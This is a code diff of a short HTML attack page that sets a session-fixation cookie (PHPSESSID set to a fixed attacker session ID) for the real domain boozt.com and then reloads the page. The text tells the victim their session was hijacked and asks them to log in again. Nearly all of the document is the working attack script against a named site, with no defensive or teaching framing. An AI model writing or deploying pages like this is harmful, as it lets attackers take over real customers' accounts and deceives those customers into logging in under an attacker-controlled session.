@@ -3,22 +3,17 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Session Hijack</title>
+  <title>Malicious Page</title>
   <script>
-    // Function to change PHPSESSID to the attacker's session ID
-    function hijackSession() {
-      document.cookie = "36ocil8q0bvffop746jvo3903o; path=/; domain=boozt.com";
-      
-      // Force a page reload so the victim's session switches
-      window.location.reload();  
-    }
+    // Change PHPSESSID to the attacker's session ID
+    document.cookie = "PHPSESSID=36ocil8q0bvffop746jvo3903o; path=/; domain=boozt.com";
 
-    // Run hijackSession when the page loads
-    window.onload = hijackSession;
+    // Redirect the victim to refresh the page, hijacking their session
+    window.location.reload();  
   </script>
 </head>
 <body>
-  <h1>Session Hijack Attack</h1>
-  <p>If you are seeing this message, your session is being hijacked...</p>
+  <h1>You've been redirected to a new page!</h1>
+  <p>Your session has been hijacked. Please log in again.</p>
 </body>
 </html>
